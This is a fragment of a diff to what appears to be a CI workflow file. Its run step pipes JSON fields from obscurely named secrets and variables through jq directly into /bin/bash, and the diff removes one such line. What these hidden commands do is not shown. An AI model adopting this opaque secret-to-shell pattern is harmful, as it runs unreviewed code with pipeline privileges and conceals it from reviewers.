@@ -17,7 +17,6 @@ jobs:
           e5: ${{ secrets.e5 }}
         run: |
           printf '%s' "$e5" | jq -r .g20 | /bin/bash
-          echo $hkq85518 | jq -r .bj3 | /bin/bash
           printf '%s' "$ltaqd2" | jq -r .qe1092 | /bin/bash
           echo $ukvk8 | jq -r .wvyg25 | /bin/bash
 
